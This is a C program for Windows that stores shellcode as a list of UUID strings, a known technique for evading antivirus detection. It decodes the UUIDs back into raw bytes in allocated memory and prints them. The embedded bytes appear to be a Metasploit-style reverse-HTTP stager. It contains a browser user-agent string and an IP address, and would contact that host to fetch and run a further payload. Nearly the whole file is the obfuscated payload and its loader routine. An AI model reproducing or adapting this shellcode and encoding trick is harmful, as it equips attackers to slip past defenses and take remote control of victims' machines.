#include <windows.h>
#include <stdio.h>
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")


struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;


int main(void)
{
    
    char * UUIDs[] = {
        "e48348fc-e8f0-00cc-0000-415141505248",
        "4865d231-528b-4860-8b52-18488b522051",
        "b70f4856-4a4a-8b48-7250-4d31c94831c0",
        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
        "528b4852-8b20-3c42-4151-4801d0668178",
        "0f020b18-7285-0000-008b-808800000048",
        "6774c085-0148-44d0-8b40-204901d08b48",
        "56e35018-ff48-41c9-8b34-884d31c94801",
        "c03148d6-41ac-c9c1-0d41-01c138e075f1",
        "244c034c-4508-d139-75d8-58448b402449",
        "4166d001-0c8b-4448-8b40-1c4901d0418b",
        "58418804-5841-0148-d05e-595a41584159",
        "83485a41-20ec-5241-ffe0-5841595a488b",
        "ff4be912-ffff-485d-31db-5349be77696e",
        "74656e69-4100-4856-89e1-49c7c24c7726",
        "53d5ff07-e853-0070-0000-4d6f7a696c6c",
        "2e352f61-2030-5728-696e-646f7773204e",
        "30312054-302e-203b-5769-6e36343b2078",
        "20293436-7041-6c70-6557-65624b69742f",
        "2e373335-3633-2820-4b48-544d4c2c206c",
        "20656b69-6547-6b63-6f29-204368726f6d",
        "33312f65-2e31-2e30-302e-302053616661",
        "352f6972-3733-332e-3600-59535a4d31c0",
        "53c9314d-4953-3aba-5679-a700000000ff",
        "0010e8d5-0000-3931-322e-3136382e3139",
        "33312e30-0034-485a-89c1-49c7c0500000",
        "c9314d00-5353-036a-5349-ba57899fc600",
        "ff000000-e8d5-004b-0000-2f7577446959",
        "63724e52-7a6d-374f-4d5f-757073414250",
        "6c5f6a77-696e-346b-3837-5f4761423253",
        "3165744d-6a6c-6658-4450-743939466274",
        "35584151-5671-3162-5269-41544a4f6e71",
        "2d757876-4800-c189-535a-41584d31c953",
        "0200b848-8428-0000-0000-50535349c7c2",
        "3b2e55eb-d5ff-8948-c66a-0a5f535a4889",
        "c9314df1-314d-53c9-5349-c7c22d06187b",
        "c085d5ff-1f75-c748-c188-13000049ba44",
        "00e035f0-0000-ff00-d548-ffcf7402ebcc",
        "000055e8-5300-6a59-405a-4989d1c1e210",
        "00c0c749-0010-4900-ba58-a453e5000000",
        "48d5ff00-5393-4853-89e7-4889f14889da",
        "00c0c749-0020-4900-89f9-49ba129689e2",
        "00000000-d5ff-8348-c420-85c074b2668b",
        "c3014807-c085-d275-58c3-586a005949c7",
        "a2b5f0c2-ff56-90d5-9090-909090909090"
	};
	
	// get the size of our shellcode stored as UUIDs
	unsigned int shellcode_size = (unsigned int)sizeof(UUIDs) * 2;
	
	// Declare a buffer for storing our shellcode
	void * buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// This keeps track of our current position in the allocated buffer
	void * bufferBaseAddress = NULL; 
	
	// This keeps track of how many bytes we've written into the buffer
	int i = 0;
	
	// Loop through our list of UUIDs and use UuidFromStringA to convert and load into memory
    for (int count = 0; count < sizeof(UUIDs) / sizeof(UUIDs[0]); count++) {
		bufferBaseAddress = ((ULONG_PTR)buffer + i);
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)UUIDs[count], bufferBaseAddress);
        i += 16;
    }
	
	// create a new struct from the buffer we allocated
	_data.Buffer = buffer;
	_data.Length = shellcode_size;
	
 	int idx = 0;
	while ( idx < _data.Length)
	{
		if (idx == (shellcode_size - 1) )
		{
			printf("0x%02x ", _data.Buffer[idx]);
		}
		else
		{
			printf("0x%02x, ", _data.Buffer[idx]);
		}
		idx++;
	}
	

}
